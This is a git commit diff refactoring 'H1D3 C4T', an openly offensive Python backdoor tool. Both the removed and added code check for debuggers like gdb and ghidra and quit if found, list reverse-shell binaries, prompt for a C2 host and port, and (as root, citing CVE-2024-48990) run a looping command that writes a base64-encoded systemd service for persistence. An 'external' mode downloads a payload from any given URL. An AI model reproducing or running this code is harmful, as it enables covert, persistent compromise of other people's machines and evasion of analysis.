cb2a20703b44836ed1204489cba8a6a9f1302432
sickb0y <148525929+0xSickb0y@users.noreply.github.com>
2024-12-26 22:45:27 -0300

    Update H1D3_C4T.py
    - Rename check_system() to check_operating_system()
    - Improve OS identification using platform.system()
    - Rename variables for convention and readability
    - Add /bin/zsh adn /usr/bin/zsh to shell_paths
    - Add support for user input to not be case sensitive
    - Change print("----") to print("-" * n)

--- H1D3_C4T.py
+++ H1D3_C4T.py
@@ -7,107 +7,12 @@
 
 import os
 import sys
-from urllib.request import urlretrieve
+import platform
 import psutil
+from urllib.request import urlretrieve
 
-def check_system():
-
-    if os.path.exists("/tmp"):
-        return "linux"
-    elif os.path.exists("C:\\"):
-        return "windows"
-    else:
-         print("[!] UNKNOW SYSTEM!? ALIEN???")
-         sys.exit(1)
-
-
-
-def check_debugger_linux():
-
-     for proc in psutil.process_iter(['pid','name']):     
-            debuggers = {'ghidra','gdb','strace'}
-            for debug in debuggers:    
-                if debug in proc.info['name'].lower():
-                    print("[!] FOUND PROCESS DEBUGGER KILL BACKDOOR")
-                    sys.exit(1)
-
-
-
-def internal_backdoor_linux():
-
-    print("[!] BACKDOOR IS INTERNAL")
-    LHOST = input("[$] SET YOUR C2 LHOST => ")
-    LPORT = input("[$] SET YOUR C2 LPORT => ")
-
-    print(f"[@] YOUR C2 {LHOST}:{LPORT}, IMPLEMENTED PERSISTENCE...")
-    reverse_shell_binary = {'/usr/bin/busybox', '/usr/local/bin/busybox', '/bin/busybox', '/usr/bin/nc', '/usr/local/bin/nc', '/bin/nc', '/usr/bin/ncat', '/usr/local/bin/ncat', '/bin/ncat', '/usr/bin/perl', '/usr/local/bin/perl', '/bin/perl', '/usr/bin/python', '/usr/local/bin/python', '/bin/python', '/usr/bin/python3', '/usr/local/bin/python3', '/bin/python3', '/usr/bin/ruby', '/usr/local/bin/ruby', '/bin/ruby'}
-    print("------------------------------------------------")
-
-    for reverse in reverse_shell_binary:
-        binary_exist = os.path.exists(reverse)
-        if binary_exist:
-            print(f"[#] FOUND BINARY TO REVERSE SHELL: {reverse}")
-    print("------------------------------------------------")
-    shell = {'/bin/bash','/bin/sh'}
-    print("------------------------------------------------")
-
-    for shell_1337 in shell:
-        if os.path.exists(shell_1337):
-            print(f"[@] SHELL IN MACHINE TARGET => {shell_1337}")
-    print("-------------------------------------------------")
-
-    if os.getuid() == 0:
-        print("[!] YOU ARE ROOT Checking target machine is vulnerable needrestart version 3.7")
-        check_version_needrestart = os.system("needrestart --version | grep 3.7 | cut -d ' ' -f1,2")
-        if str(check_version_needrestart).split("3.7"):
-            choice_cve = input("[!] VERSION IS VULNERABLE DO YOU WANT IMPLEMENT THIS? <(For more information CVE-2024-48990)> y/n -> ")
-            if choice_cve == "y":
-                print("[1337] IMPLEMENT PERSISTENCE!")
-                Payload = "while true; do sleep 3; echo 'W1VuaXRdCkRlc2NyaXB0aW9uPVVwZGF0ZSBTeXN0ZW0KCltTZXJ2aWNlXQpUeXBlPXNpbXBsZQpFeGVjU3RhcnQ9L2Jpbi9iYXNoIC1jICJuZWVkcmVzdGFydCIKUmVzdGFydD1hbHdheXMKUmVzdGFydFNlYz01CgpbSW5zdGFsbF0KV2FudGVkQnk9bXVsdGktdXNlci50YXJnZXQK' | base64 -d > /etc/systemd/system/update.service; systemctl enable update && systemctl start update && systemctl daemon-reload; sleep 10; done &"
-                os.system(Payload)
-            elif choice_cve == "n":
-                print("[!] YOU ARE NOT WANT IMPLEMENT THIS PERSISTENCE")
-            else:
-                print("TRY AGAIN y/n 7w7")
-        else:
-            print("[!] TARGET MACHINE NOT VULNERABILITY VERSION NEEDRESTART :(")
-    else:
-            print("YOU ARE NOT ROOT!")
-            sys.exit(1)
-    print("-------------------------------------------------")
-
-
-
-def external_backdoor_linux():
-
-    print("[!] BACKDOOR IS EXTERNAL")
-    choice_payload_attacker = input("[*] Is Your Payload On The Network Or On The Local Machine? surface/local => ")
-    if "surface" in choice_payload_attacker:
-        url_payload = input("[@] URL YOUR PAYLOAD => ")
-        url_payload_dest = input("[#] PUT DESTINATION PATH FOR PAYLOAD (example /tmp/) => ")
-        url_payload_name = input("[$] NAME YOUR PAYLOAD (example backdoor.sh)  => ")
-        url = url_payload
-        dst = url_payload_dest + url_payload_name
-        urlretrieve(url, dst)
-        if os.path.exists(dst):
-            print(f"[7w7] Payload Found In -> {dst}")
-            print("[1337] IMPLEMENTED PERSISTENCE IN PAYLOAD")
-        else:
-            print("[!] Payload Not Found => ")
-            sys.exit(1)
-    elif "local" in choice_payload_attacker:
-        path_payload = input("[#] PATH YOUR PAYLOAD => ")
-        access_payload = os.path.exists(path_payload)
-        if access_payload:
-            print("[1337] IMPLEMENTED PERSITENCE IN  PAYLOAD")
-        else:
-            print(f"[!] NOT FOUND PATH PAYLOAD TRY AGAIN! => {path_payload}")
-    else:
-        print("[!] ?????? TRY AGAIN -> surface or local")
-
-
-
-print(r'''
+def banner():
+    print(r'''
        
            \`*-.                    
             )  _`-.                 
@@ -124,29 +29,135 @@ print(r'''
             .*' /  .*' ; .*`- +'  `*' 
             `*-*   `*-*  `*-*'
 
-    H1D3 C4T ||NULLBYTE||
-''')
+    H1D3 C4T ||NULLBYTE|| 
+    ''')
 
-print("-----------------------------------------------")
-print("[!] Checking Operating System...")
-check_system()
-print("[!] Checking Anti-Malware/Debuggers Running...")
-check_debugger_linux()
-print("-----------------------------------------------")
-
-if "linux" in check_system():
-    print("[!] SYSTEM LINUX")
-    choice_linux = input("[#] YOU WANT USE EXTERNAL BACKDOOR OR INTERNAL BACKDOOR? internal/external => ")
-    if "internal" in choice_linux:
-        internal_backdoor_linux()
-    elif "external" in choice_linux:
-        external_backdoor_linux()
+def check_operating_system():
+    print("-" * 48)
+    print("[!] Checking Operating System...")
+    
+    os_name = platform.system().lower()
+    if os_name in ["linux", "linux2", "darwin", "windows", "win32", "cygwin"]:
+        return os_name
     else:
-        print("[!] Write internal or external try again! 7w7")
+         print("[!] UNKNOW SYSTEM!? ALIEN???")
+         sys.exit(1)
+
+def check_debugger_linux():
+     for proc in psutil.process_iter(['pid','name']):     
+            debuggers = {'ghidra','gdb','strace'}
+            for debug in debuggers:    
+                if debug in proc.info['name'].lower():
+                    print("[!] FOUND PROCESS DEBUGGER KILL BACKDOOR")
+                    sys.exit(1)
+
+
+
+def internal_backdoor_unix():
+
+    print("[!] BACKDOOR IS INTERNAL")
+    
+    lhost = input("[$] SET YOUR C2 LHOST => ")
+    lport = input("[$] SET YOUR C2 LPORT => ")
+    
+    print(f"[@] YOUR C2 {lhost}:{lport}, IMPLEMENTED PERSISTENCE...")
+
+    binary_paths = ['/usr/bin/busybox', '/usr/local/bin/busybox', '/bin/busybox', '/usr/bin/nc',
+                    '/usr/local/bin/nc', '/bin/nc', '/usr/bin/ncat', '/usr/local/bin/ncat',
+                    '/bin/ncat', '/usr/bin/perl', '/usr/local/bin/perl', '/bin/perl',
+                    '/usr/bin/python', '/usr/local/bin/python', '/bin/python', '/usr/bin/python3',
+                    '/usr/local/bin/python3', '/bin/python3', '/usr/bin/ruby', '/usr/local/bin/ruby', '/bin/ruby']
+
+    print("-" * 48)
+
+    for binary in binary_paths:
+        if os.path.exists(binary):
+            print(f"[#] FOUND BINARY FOR REVERSE SHELL: {binary}")
+
+    print("-" * 48)
+    shell_paths = ['/bin/bash','/bin/sh', '/bin/zsh', '/usr/bin/zsh']
+    print("-" * 48)
+
+
+    for shell in shell_paths:
+        if os.path.exists(shell):
+            print(f"[@] SHELL IN MACHINE TARGET => {shell}")
+    print("-" * 48)
+
+    if os.getuid() == 0:
+        print("[!] YOU ARE ROOT Checking target machine is vulnerable needrestart version 3.7")
+        check_version_needrestart = os.system("needrestart --version | grep 3.7 | cut -d ' ' -f1,2")
+        if str(check_version_needrestart).split("3.7"):
+            user_input = input("[!] VERSION IS VULNERABLE DO YOU WANT IMPLEMENT THIS? <(For more information CVE-2024-48990)> y/n -> ").lower()
+            if user_input == "y":
+                print("[1337] IMPLEMENT PERSISTENCE!")
+                Payload = "while true; do sleep 3; echo 'W1VuaXRdCkRlc2NyaXB0aW9uPVVwZGF0ZSBTeXN0ZW0KCltTZXJ2aWNlXQpUeXBlPXNpbXBsZQpFeGVjU3RhcnQ9L2Jpbi9iYXNoIC1jICJuZWVkcmVzdGFydCIKUmVzdGFydD1hbHdheXMKUmVzdGFydFNlYz01CgpbSW5zdGFsbF0KV2FudGVkQnk9bXVsdGktdXNlci50YXJnZXQK' | base64 -d > /etc/systemd/system/update.service; systemctl enable update && systemctl start update && systemctl daemon-reload; sleep 10; done &"
+                os.system(Payload)
+            elif user_input == "n":
+                print("[!] YOU ARE NOT WANT IMPLEMENT THIS PERSISTENCE")
+            else:
+                print("TRY AGAIN y/n 7w7")
+        else:
+            print("[!] TARGET MACHINE NOT VULNERABILITY VERSION NEEDRESTART :(")
+    else:
+            print("YOU ARE NOT ROOT!")
+            sys.exit(1)
+    print("-" * 48)
+
+
+
+def external_backdoor_unix():
+
+    print("[!] BACKDOOR IS EXTERNAL")
+    user_input = input("[*] Is Your Payload On The Network Or On The Local Machine? surface/local => ").lower()
+
+    if user_input == "surface":
+        url_payload = input("[@] URL OF YOUR PAYLOAD => ")
+        url_payload_dest = input("[#] PUT DESTINATION PATH FOR PAYLOAD (example /tmp/) => ")
+        url_payload_name = input("[$] NAME YOUR PAYLOAD (example backdoor.sh)  => ")
+        url = url_payload
+        dst = url_payload_dest + url_payload_name
+        urlretrieve(url, dst)
+        if os.path.exists(dst):
+            print(f"[7w7] Payload Found In -> {dst}")
+            print("[1337] IMPLEMENTED PERSISTENCE IN PAYLOAD")
+        else:
+            print("[!] Payload Not Found => ")
+            sys.exit(1)
+    elif user_input == "local":
+        path_payload = input("[#] PATH YOUR PAYLOAD => ")
+        access_payload = os.path.exists(path_payload)
+        if access_payload:
+            print("[1337] IMPLEMENTED PERSITENCE IN PAYLOAD")
+        else:
+            print(f"[!] NOT FOUND PATH PAYLOAD TRY AGAIN! => {path_payload}")
+    else:
+        print("[!] ?????? TRY AGAIN -> surface or local")
+
+
+if __name__ == "__main__":
+    banner()
+
+    os_name = check_operating_system()
+    print("[!] Checking Anti-Malware/Debuggers Running...")
+    check_debugger_linux()
+    print("-" * 48)
+
+    if os_name in ["linux", "linux2", "darwin"]:
+        print("[!] UNIX BASED SYSTEM")
+        user_input = input("[#] YOU WANT USE EXTERNAL BACKDOOR OR INTERNAL BACKDOOR? [internal/external] => ").lower()
+        if user_input == "internal":
+            internal_backdoor_unix()
+        elif user_input == "external":
+            external_backdoor_unix()
+        else:
+            print("[!] Write internal or external try again! 7w7")
+            sys.exit(1)
+
+    elif os_name in ["windows", "win32", "cygwin"]:
+        print("[!] WINDOWS SYSTEM!")
+        choice_windows = input("[#] YOU WANT USE EXTERNAL BACKDOOR OR INTERNAL BACKDOOR? internal/external => ")
+
+    else:
+        print("[!] OPERATING SYSTEM UNKNOWN")
         sys.exit(1)
-elif "windows" in check_system():
-    print("[!] SYSTEM WINDOWS!")
-    choice_windows = input("[#] YOU WANT USE EXTERNAL BACKDOOR OR INTERNAL BACKDOOR? internal/external => ")
-else:
-    print("[!] MACHINE UNKNOW")
-    sys.exit(1)
